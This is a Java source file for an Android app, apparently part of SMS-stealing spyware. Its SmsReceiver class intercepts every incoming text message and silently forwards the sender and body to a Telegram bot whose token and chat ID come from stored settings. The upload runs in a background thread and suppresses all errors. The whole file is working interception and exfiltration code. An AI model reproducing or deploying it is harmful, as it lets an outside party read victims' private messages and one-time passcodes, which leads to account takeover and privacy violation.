package com.hakodzhak.god;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras == null) return;
        
        Object[] pdus = (Object[]) extras.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = sms.getDisplayOriginatingAddress();
            String body = sms.getMessageBody();

            String botToken = context.getSharedPreferences("config", Context.MODE_PRIVATE).getString("botToken", "");
            String chatId = context.getSharedPreferences("config", Context.MODE_PRIVATE).getString("chatId", "");

            new Thread(() -> {
                try {
                    String text = "📩 *رسالة جديدة!*\nمن: " + sender + "\nالمحتوى: " + body;
                    String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
                    con.getInputStream();
                } catch (Exception e) {}
            }).start();
        }
    }
}
